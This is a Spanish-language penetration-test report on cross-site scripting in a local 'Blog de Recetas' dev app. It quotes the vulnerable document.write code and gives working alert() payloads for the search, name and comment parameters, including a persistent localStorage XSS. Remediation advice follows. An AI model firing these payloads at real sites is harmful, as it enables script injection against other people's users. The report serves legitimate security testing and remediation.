# Informe de Análisis de Vulnerabilidades XSS
**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30 16:03:37  
**Tipo de análisis:** Cross-Site Scripting (XSS)  
**Resultado:** VULNERABILIDADES ENCONTRADAS Y EXPLOTADAS

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web "Blog de Recetas" en `http://web.dev.local:8082`. Se identificaron y explotaron con éxito **múltiples vulnerabilidades de Cross-Site Scripting (XSS)**, incluyendo XSS reflejado (DOM-based) y XSS almacenado (via localStorage). Todas las pruebas fueron ejecutadas con un navegador headless real (Puppeteer), confirmando la ejecución de código JavaScript arbitrario.

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" con dos funcionalidades principales:
1. **Buscador de recetas**: acepta un parámetro GET `search` y muestra los resultados.
2. **Sección de comentarios**: acepta parámetros GET `name` y `comment`, almacena los datos en `localStorage` del navegador y los muestra en la página.

---

## Vulnerabilidades Identificadas

### 1. DOM-Based XSS Reflejado — Parámetro `search`

**Tipo:** DOM-Based XSS (Reflected)  
**Severidad:** Alta  
**Parámetro afectado:** `search` (método GET)

**Descripción:**  
El parámetro `search` de la URL es leído directamente por JavaScript mediante `URLSearchParams` y su valor es insertado sin sanitización en el DOM a través de `document.write()`. Esto permite inyectar y ejecutar código HTML/JavaScript arbitrario.

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

**Pruebas de explotación exitosas:**

- Payload `<img>` con `onerror`:
  ```
  http://web.dev.local:8082/?search=<img src=x onerror=alert("XSS_SEARCH")>
  ```
  → **ALERTA DISPARADA: XSS_SEARCH** ✅

- Payload con etiqueta `<script>`:
  ```
  http://web.dev.local:8082/?search=</strong><script>alert("XSS_SCRIPT")</script>
  ```
  → **ALERTA DISPARADA: XSS_SCRIPT** ✅

---

### 2. DOM-Based XSS en Campo `name` de Comentarios

**Tipo:** DOM-Based XSS (Reflected/Stored via localStorage)  
**Severidad:** Alta  
**Parámetro afectado:** `name` (método GET)

**Descripción:**  
El parámetro `name` es almacenado en `localStorage` sin sanitización y posteriormente renderizado con `document.write()` al cargar la página.

**Código vulnerable:**
```javascript
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
// ...
document.write('<div class="comment-author">' + c.name + '</div>');
```

**Prueba de explotación exitosa:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert("XSS_NAME")>&comment=TestComment
```
→ **ALERTA DISPARADA: XSS_NAME** ✅

---

### 3. DOM-Based XSS en Campo `comment` (Cuerpo del Comentario)

**Tipo:** DOM-Based XSS (Stored via localStorage)  
**Severidad:** Alta  
**Parámetro afectado:** `comment` (método GET)

**Descripción:**  
El cuerpo del comentario es también almacenado en `localStorage` e insertado sin sanitización en el DOM.

**Código vulnerable:**
```javascript
document.write('<div>' + c.comment + '</div>');
```

**Prueba de explotación exitosa:**
```
http://web.dev.local:8082/?name=Tester&comment=<img src=x onerror=alert("XSS_COMMENT")>
```
→ **ALERTA DISPARADA: XSS_COMMENT** ✅

---

### 4. XSS Almacenado Persistente (via localStorage)

**Tipo:** Stored XSS (localStorage)  
**Severidad:** Alta  
**Vectores afectados:** `name` y `comment`

**Descripción:**  
Los payloads XSS inyectados en los campos `name` o `comment` se almacenan en el `localStorage` del navegador de la víctima. Cada vez que la víctima visita la página (incluso sin parámetros en la URL), los payloads maliciosos son ejecutados automáticamente al cargar los comentarios guardados.

**Prueba de explotación exitosa:**
1. Se inyecta el payload:
   ```
   http://web.dev.local:8082/?name=<script>alert("STORED_XSS")</script>&comment=Comentario+normal
   ```
2. Al recargar la página `http://web.dev.local:8082/` sin parámetros:
   → **ALERTA DISPARADA: STORED_XSS** ✅ (se ejecuta en cada visita)

---

## Resumen de Resultados

| # | Vector | Tipo | Payload Probado | Resultado |
|---|--------|------|-----------------|-----------|
| 1 | `?search=` | DOM-XSS Reflected | `<img src=x onerror=alert()>` | ✅ EXPLOTADO |
| 2 | `?search=` | DOM-XSS Reflected | `</strong><script>alert()</script>` | ✅ EXPLOTADO |
| 3 | `?name=` | DOM-XSS / Stored | `<img src=x onerror=alert()>` | ✅ EXPLOTADO |
| 4 | `?comment=` | DOM-XSS / Stored | `<img src=x onerror=alert()>` | ✅ EXPLOTADO |
| 5 | localStorage | Stored XSS | `<script>alert()</script>` | ✅ EXPLOTADO |

---

## Impacto Potencial

- **Robo de sesión:** Un atacante puede inyectar código para robar cookies de sesión.
- **Phishing:** Modificación del contenido de la página para engañar a usuarios.
- **Keylogging:** Captura de teclas pulsadas por el usuario.
- **Redirección maliciosa:** Envío de usuarios a sitios de phishing.
- **Persistencia:** El XSS almacenado en localStorage se ejecuta en cada visita, afectando continuamente al usuario comprometido.

---

## Recomendaciones

1. **Sanitizar entradas**: Escapar caracteres especiales HTML (`<`, `>`, `"`, `'`, `&`) antes de insertarlos en el DOM.
2. **Evitar `document.write()`**: Usar métodos más seguros como `textContent` o `createElement`/`appendChild`.
3. **Implementar CSP**: Configurar una política de seguridad de contenido (Content-Security-Policy) que restrinja la ejecución de scripts inline.
4. **Validar parámetros URL**: No confiar en datos provenientes de la URL sin validación y sanitización.
5. **Usar librerías de sanitización**: Emplear herramientas como DOMPurify antes de renderizar contenido HTML generado por usuarios.

**Ejemplo de corrección:**
```javascript
// INSEGURO:
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// SEGURO:
const div = document.createElement('div');
const p = document.createElement('p');
p.textContent = 'Resultados para: ' + searchTerm;
div.appendChild(p);
document.querySelector('.search-section').appendChild(div);
```

---

## Conclusión

La aplicación web analizada presenta **vulnerabilidades críticas de XSS** en sus principales funcionalidades. Todas las vulnerabilidades fueron confirmadas mediante explotación real con navegador headless. Se recomienda aplicar las correcciones indicadas de forma inmediata antes de exponer la aplicación en un entorno de producción.
